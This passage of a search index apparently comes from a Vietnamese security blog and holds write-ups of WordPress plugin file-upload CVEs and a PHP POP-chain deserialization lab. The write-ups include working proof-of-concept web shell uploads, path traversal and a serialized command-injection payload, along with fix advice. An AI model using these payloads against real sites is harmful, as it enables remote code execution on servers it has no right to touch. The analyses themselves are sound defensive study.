TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image\\/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible ‚Üí Arbitrary File Upload / RCE\"]\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image\\/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible ‚Üí Arbitrary File Upload / RCE\"]\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image\\/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible ‚Üí Arbitrary File Upload / RCE\"]\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image\\/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible ‚Üí Arbitrary File Upload / RCE\"]\r","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rL·∫•y nonce t·ª´ m√£ ngu·ªìn tr·∫£ v·ªÅ G·ª≠i POST request POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=staggs_get_configuration_form_urls\u0026nonce=f281c84283\u0026image_id=1\u0026image=data:image/php;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg== V·ªõi PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg== m√£ h√≥a base64 c·ªßa \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Request v·ªõi Web Shell payload\rTruy c·∫≠p URL tr·∫£ v·ªÅ v√† RCE RCE v·ªõi file upload\r","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng cho ph√©p unauthenticated k·∫ª t·∫•n c√¥ng t·∫£i l√™n file t√πy √Ω (v√≠ d·ª• web shell) th√¥ng qua endpoint AJAX c·ªßa plugin STAGGS do thi·∫øu x√°c th·ª±c ki·ªÉu file tr∆∞·ªõc khi l∆∞u. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·∫•y nonce t·ª´ m√£ ngu·ªìn c√¥ng khai, g·ª≠i data: URI gi·∫£ m·∫°o (vd. data:image/php;base64,...) v√† t·∫°o file PHP tr√™n m√°y ch·ªß, d·∫´n t·ªõi RCE. V·∫•n ƒë·ªÅ ƒë√£ ƒë∆∞·ª£c kh·∫Øc ph·ª•c trong phi√™n b·∫£n 2.12.0 b·∫±ng c√°ch gi·ªõi h·∫°n ph·∫ßn m·ªü r·ªông ƒë∆∞·ª£c ch·∫•p nh·∫≠n (png, jpg, jpeg, gif). ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rL·ªó h·ªïng b·∫Øt ngu·ªìn t·ª´ kh√¥ng ki·ªÉm tra h·ª£p l·ªá ki·ªÉu/ƒëu√¥i file tr∆∞·ªõc khi l∆∞u; ki·ªÉm tra client-side/regex kh√¥ng ƒë·ªß n·∫øu kh√¥ng r√†ng bu·ªôc ph·∫ßn m·ªü r·ªông v√† n·ªôi dung th·ª±c t·∫ø. Kh√¥ng ƒë·ªÉ endpoint quan tr·ªçng cho ph√©p h√†nh ƒë·ªông upload ch·∫°y ·ªü ch·∫ø ƒë·ªô nopriv (unauthenticated) n·∫øu kh√¥ng c√≥ c∆° ch·∫ø x√°c th·ª±c v√† h·∫°n ch·∫ø ch·∫∑t. nonce ch√®n trong m√£ ngu·ªìn c√≥ th·ªÉ b·ªã thu th·∫≠p v√† t√°i s·ª≠ d·ª•ng ‚Äî kh√¥ng d·ª±a ch·ªâ v√†o nonce hi·ªÉn th·ªã c√¥ng khai ƒë·ªÉ ngƒÉn thao t√°c nh·∫°y c·∫£m. C·∫ßn validate c·∫£ MIME type, ph·∫ßn m·ªü r·ªông, v√† (n·∫øu c√≥ th·ªÉ) ki·ªÉm tra n·ªôi dung th·ª±c t·∫ø c·ªßa file tr√™n server; l∆∞u file upload ·ªü v·ªã tr√≠ kh√¥ng th·ªÉ th·ª±c thi ho·∫∑c chuy·ªÉn ƒë·ªïi th√†nh non-executable. C·∫≠p nh·∫≠t plugin l√™n \u003e= 2.12.0 ngay l·∫≠p t·ª©c; ki·ªÉm tra site cho c√°c file kh·∫£ nghi trong th∆∞ m·ª•c upload staggs/ n·∫øu site ch·∫°y phi√™n b·∫£n c≈©. ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress STAGGS Plugin \u003c= 2.11.0 is vulnerable to Arbitrary File Upload ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE.","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/"},{"categories":["CVE Analyst"],"collections":null,"content":"Intro\rTrong qu√° tr√¨nh nghi√™n c·ª©u Insecure Deserialization, m√¨nh nh·∫≠n ƒë∆∞·ª£c m·ªôt lab li√™n quan ƒë·∫øn POP Chain (Property-Oriented Programming Chain). ƒê√¢y l√† m·ªôt d·∫°ng t·∫•n c√¥ng th√∫ v·ªã: thay v√¨ khai th√°c h√†m hay l·ªánh tr·ª±c ti·∫øp, k·∫ª t·∫•n c√¥ng k·∫øt h·ª£p c√°c gadget (c√°c ph∆∞∆°ng th·ª©c magic c·ªßa class) ƒë·ªÉ ƒë·∫°t ƒë∆∞·ª£c m·ª•c ti√™u ‚Äî v√≠ d·ª• th·ª±c thi l·ªánh h·ªá th·ªëng (RCE). B√†i vi·∫øt n√†y m√¥ t·∫£ qu√° tr√¨nh m√¨nh ph√¢n t√≠ch v√† khai th√°c lab: t·ª´ xem qua m√£ ngu·ªìn, nh·∫≠n di·ªán c√°c gadget h·ªØu d·ª•ng, t·ªõi c√°ch x√¢y payload ƒë·ªÉ k√≠ch ho·∫°t chu·ªói g·ªçi (POP chain). M·ª•c ti√™u l√† gi√∫p b·∫°n hi·ªÉu ƒë∆∞·ª£c ph∆∞∆°ng ph√°p t∆∞ duy khi x·ª≠ l√Ω lab ki·ªÉu n√†y. Lab m√¨nh th·ª±c hi·ªán: https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:1:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#intro"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:2:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"T·ªïng quan m√£ ngu·ªìn\r\u003c?php class User{ public $name; private $memo; function __construct($name){ $this-\u003ename=$name; } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003erecord($this-\u003ewhale, $this-\u003econtent); return 'Record for '.$this-\u003ewhale.' is : '.$this-\u003econtent; } function record($whale, $content){ //check whether it's an attribute $test=$whale-\u003e$content; if ($test!=NULL){ echo(\"It's probably an attribute\"); } } } class Whale{ public $name; private $note; function __construct($name){ $this-\u003ename=$name; } function take_note($note){ $this-\u003enote=date(\"Y/m/d H:i:s\").$note; } function __get($attribute){ system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); return $this-\u003e$attribute; } function __toString(){ return $this-\u003ename; } } if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } ?\u003e File ch√≠nh c√≥ ba class quan tr·ªçng: User, Note, Whale. Cu·ªëi file c√≥ d√≤ng unserialize ƒë·∫ßu v√†o n·∫øu $_POST['pop'] ƒë∆∞·ª£c g·ª≠i: if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } Nh·ªØng ƒëi·ªÉm ƒë√°ng ch√∫ √Ω: D√≤ng 8: User::__wakeup() t·∫°o m·ªôt Note v√† g√°n v√†o $this-\u003ememo. D√≤ng 23: Note::__toString() g·ªçi record() r·ªìi tr·∫£ v·ªÅ m·ªôt chu·ªói. D√≤ng 28: Note::record() truy xu·∫•t $whale-\u003e$content. D√≤ng 44: Whale::__get() g·ªçi system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt');. D√≤ng 52: v·ªã tr√≠ g·ªçi unserialize(...) ‚Äî ƒëi·ªÉm t·∫•n c√¥ng. ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:2:1","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#t·ªïng-quan-m√£-ngu·ªìn"},{"categories":["CVE Analyst"],"collections":null,"content":"Lu·ªìng th·ª±c thi d·∫´n ƒë·∫øn shell\rUnserialize m·ªôt User: Khi unserialize m·ªôt object User, magic method __wakeup() s·∫Ω ch·∫°y. ·ªû ƒë√¢y __wakeup() kh·ªüi t·∫°o m·ªôt Note m·ªõi b·∫±ng c√°ch l·∫•y $this-\u003ename . \"say hello\" l√†m content v√† 'test_whale' l√†m whale: $this-\u003ememo = new Note($this-\u003ename . \"say hello\", 'test_whale'); Note::__toString() s·∫Ω g·ªçi record(): __toString() trong Note g·ªçi record($this-\u003ewhale, $this-\u003econtent) tr∆∞·ªõc khi tr·∫£ v·ªÅ chu·ªói. __toString() ƒë∆∞·ª£c g·ªçi khi ƒë·ªëi t∆∞·ª£ng b·ªã √©p sang chu·ªói. Ta l·ª£i d·ª•ng $this-\u003ename l√†m ƒë·ªëi t∆∞·ª£ng c·ªßa note s·∫Ω b·ªã √©p sang chu·ªói khi concat \"say hello\" ·ªü d√≤ng 9. record() truy xu·∫•t thu·ªôc t√≠nh ƒë·ªông tr√™n $whale: Trong record() c√≥ d√≤ng: $test = $whale-\u003e$content; N·∫øu $whale l√† m·ªôt object Whale v√† $content kh√¥ng kh·ªõp thu·ªôc t√≠nh t·ªìn t·∫°i, PHP s·∫Ω g·ªçi magic Whale::__get($attribute). Whale::__get() th·ª±c thi system(): __get() c·ªßa Whale ch·ª©a: system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); V√¨ system() ch·∫°y shell, n·∫øu $this-\u003ename ch·ª©a k√Ω t·ª± ph√° v·ª° l·ªánh (v√≠ d·ª• \"; ls /; echo \"), attacker c√≥ th·ªÉ ch√®n v√† th·ª±c thi l·ªánh shell d·∫´n t·ªõi RCE. ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:2:2","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#lu·ªìng-th·ª±c-thi-d·∫´n-ƒë·∫øn-shell"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\rT·∫°o 1 file t∆∞∆°ng t·ª± file g·ªëc nh∆∞ng ch·ª©a code t·∫°o serialize: \u003c?php class User{ public $name; private $memo; function __construct(){ $this-\u003ename= new Note(\"Top2\",new Whale(('\"; ls /; echo \"'))); } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003erecord($this-\u003ewhale, $this-\u003econtent); return 'Record for '.$this-\u003ewhale.' is : '.$this-\u003econtent; } function record($whale, $content){ //check whether it's an attribute $test=$whale-\u003e$content; if ($test!=NULL){ echo(\"It's probably an attribute\"); } } } class Whale{ public $name; private $note; function __construct($name){ $this-\u003ename=$name; } function take_note($note){ $this-\u003enote=date(\"Y/m/d H:i:s\").$note; } function __get($attribute){ system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); return $this-\u003e$attribute; } function __toString(){ return $this-\u003ename; } } $u = new User(); $searialize = serialize($u); echo base64_encode(''. $searialize .''); ?\u003e Ch·∫°y file n√†y v√† copy chu·ªói base64 tr·∫£ v·ªÅ: Chu·ªói base64 tr·∫£ v·ªÅ\rG·ª≠i request theo c√∫ ph√°p challenge RCE th√†nh c√¥ng\r","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:3:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Elementor Website Builder Plugin.","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Arbitrary File Upload trong Elementor Website Builder plugin cho WordPress. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn Elementor Website Builder: t·ª´ phi√™n b·∫£n 3.3.0 ƒë·∫øn 3.18.1. CVE ID: CVE-2023-48777 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.3.0-3.18.1 Patched Versions: 3.18.2 CVSS severity: High (9.9) Required Privilege: Contributor Product: WordPress Elementor Website Builder Plugin ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Elementor Website Builder: 3.3.0 ‚Äì vulnerable 3.18.2 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rL·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng ki·ªÉm tra lo·∫°i file (file type) h·ª£p l·ªá tr∆∞·ªõc khi l∆∞u tr·ªØ l√™n server, cho ph√©p k·∫ª t·∫•n c√¥ng t·∫£i l√™n c√°c file c√≥ ƒë·ªãnh d·∫°ng nguy hi·ªÉm. Trong phi√™n b·∫£n 3.18.1, h√†m handle_elementor_upload() kh√¥ng th·ª±c hi·ªán x√°c minh file type khi x·ª≠ l√Ω d·ªØ li·ªáu t·∫£i l√™n t·ª´ tham s·ªë fileData: public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } private function save_base64_to_tmp_file( $file ) { $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } Trong b·∫£n v√° 3.18.2, nh√† ph√°t tri·ªÉn ƒë√£ b·ªï sung ki·ªÉm tra lo·∫°i file h·ª£p l·ªá tr∆∞·ªõc khi l∆∞u tr·ªØ b·∫±ng c√°ch truy·ªÅn th√™m tham s·ªë $allowed_file_extensions v√†o h√†m save_base64_to_tmp_file(), nh·∫±m ngƒÉn ch·∫∑n vi·ªác t·∫£i l√™n c√°c file ƒë·ªôc h·∫°i: public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file, $allowed_file_extensions ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } private function save_base64_to_tmp_file( $file, $allowed_file_extensions = null ) { $file_extension = pathinfo( $file['fileName'], PATHINFO_EXTENSION ); $is_file_type_allowed = $this-\u003eis_file_type_allowed( $file_extension, $allowed_file_extensions ); if ( is_wp_error( $is_file_type_allowed ) ) { return $is_file_type_allowed; } $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rQu√° tr√¨nh upload template c√≥ n·ªôi dung ·ªü d·∫°ng Base64 ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ sau: d·ªØ li·ªáu trong $file['fileData'] ƒë∆∞·ª£c gi·∫£i m√£ b·∫±ng base64_decode v√† g√°n v√†o bi·∫øn $file_content: $file_content = base64_decode( $file['fileData'] ); Sau khi gi·∫£i m√£, h√†m save_base64_to_tmp_file() s·∫Ω g·ªçi ƒë·∫øn create_temp_file() ƒë·ªÉ l∆∞u n·ªôi dung n√†y th√†nh file template tr√™n server: public function create_temp_file( $file_content, $file_name ) { $temp_filename = $this-\u003ecreate_unique_dir() . $file_name; file_put_contents( $temp_filename, $file_content ); // phpcs:ignore return $temp_filename; } ƒê∆∞·ªùng d·∫´n l∆∞u file ƒë∆∞·ª£c t·∫°o b·∫±ng c√°ch n·ªëi $file_name v·ªõi k·∫øt qu·∫£ tr·∫£ v·ªÅ t·ª´ create_unique_dir() - h√†m n√†y t·∫°o ƒë∆∞·ªùng d·∫´n l∆∞u tr·ªØ template t·∫°m th·ªùi: public function create_unique_dir() { $unique_dir_path = $this-\u003eget_temp_dir() . uniqid() . DIRECTORY_SEPARATOR; wp_mkdir_p( $unique_dir_path ); return $unique_dir_path; } H√†m create_unique_dir() ch·ªãu tr√°ch nhi·ªám t·∫°o th∆∞ m·ª•c ch·ª©a template t·∫°m th·ªùi, c√≥ d·∫°ng: wp-content/uploads/elementor/tmp/\u003cfilename\u003e Trong ƒë√≥, \u003cuniqueId\u003e ƒë∆∞·ª£c sinh t·ª± ƒë·ªông b·∫±ng uniqid() ƒë·ªÉ ƒë·∫£m b·∫£o ƒë∆∞·ªùng d·∫´n kh√¥ng tr√πng l·∫∑p. wp_mkdir_p() s·∫Ω t·∫°o th∆∞ m·ª•c v·∫≠t l√Ω tr√™n server ƒë·ªÉ l∆∞u tr·ªØ template n√†y. Cu·ªëi c√πng create_temp_file() s·∫Ω g·ªçi ƒë·∫øn file_put_contents( $temp_filename, $file_content ) ƒë·ªÉ l∆∞u tr·ªØ n·ªôi dung c·ªßa $file_content v√†o $temp_filename L·ªói\rT·∫≠n d√πng vi·ªác kh√¥ng sanitize file name ·ªü ƒë√¢y, ta k·∫øt h·ª£p t·∫•n c√¥ng path travesal ƒë·ªÉ file ƒë∆∞·ª£c l∆∞u ·ªü v·ªã tr√≠ c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c, v∆∞·ª£t qua ƒë∆∞·ª£c t√≠nh ch·∫•t ng·∫´u nhi√™n c·ªßa uniqid() public function import_template( array $data ) { // If the template is a JSON file, allow uploading it. add_filter( 'elementor/files/allow-file-type/json', [ $this, 'enable_json_template_upload' ] ); add_filter( 'elementor/files/allow_unfiltered_upload', [ $this, 'enable_json_template_upload' ] ); // Imported templates can be either JSON files, or Zip files containing multiple JSON files $upload_result = Plugin::$instance-\u003euploads_manager-\u003ehandle_elementor_upload( $data, [ 'zip', 'json' ] ); ... } handle_elementor_upload() ƒë∆∞·ª£c g·ªçi trong import_template(). Theo nh∆∞ comment c·ªßa developer th√¨ n·∫øu template l√† JSON file th√¨ ƒë∆∞·ª£c ph√©p upload, ta ƒë·∫∑t debug v√† th·ª±c hi·ªán upload JSON template: T·∫°o post b·∫±ng Elementor Click v√†o folder icon V·ªã tr√≠ folder icon\rClick v√†o upload icon V·ªã tr√≠ upload icon\rGiao di·ªán upload\rCh·ªçn JSON file v√† upload Debuger nh·∫£y t·ªõi import_template sau khi upload JSON file\r","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation ‚Üí Arbitrary File Upload\"]\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation ‚Üí Arbitrary File Upload\"]\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation ‚Üí Arbitrary File Upload\"]\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation ‚Üí Arbitrary File Upload\"]\r","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o JSON file ch·ª©a web shell PHP \u003c?php system($_REQUEST[\"cmd\"])?\u003e Upload v√† b·∫Øt request b·∫±ng BurpSuite S·ª≠a ƒë·ªïi file extension th√†nh PHP k·∫øt h·ª£p path traversal v√† g·ª≠i request Request v·ªõi path traversal v√† .php\rK·∫øt qu·∫£ RCE v·ªõi file upload\r","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2023-48777 cho ph√©p ng∆∞·ªùi d√πng c√≥ quy·ªÅn Contributor t·∫£i l√™n c√°c file ƒë·ªôc h·∫°i do thi·∫øu ki·ªÉm tra lo·∫°i file tr∆∞·ªõc khi l∆∞u tr·ªØ. ƒêi·ªÅu n√†y c√≥ th·ªÉ d·∫´n ƒë·∫øn Arbitrary File Upload v√† Remote Code Execution (RCE) n·∫øu m√°y ch·ªß cho ph√©p th·ª±c thi file upload. L·ªói ƒë√£ ƒë∆∞·ª£c v√° trong phi√™n b·∫£n 3.18.2 b·∫±ng c√°ch b·ªï sung ki·ªÉm tra ph·∫ßn m·ªü r·ªông file h·ª£p l·ªá tr∆∞·ªõc khi ghi ra ƒëƒ©a. ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rLu√¥n x√°c th·ª±c lo·∫°i file tr∆∞·ªõc khi l∆∞u. Kh√¥ng tin t∆∞·ªüng d·ªØ li·ªáu Base64 ho·∫∑c t√™n file t·ª´ client. Gi·ªõi h·∫°n quy·ªÅn upload v√† t√°ch bi·ªát th∆∞ m·ª•c l∆∞u file kh·ªèi v√πng th·ª±c thi m√£. ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#key-takeaway"},{"categories":["CVE 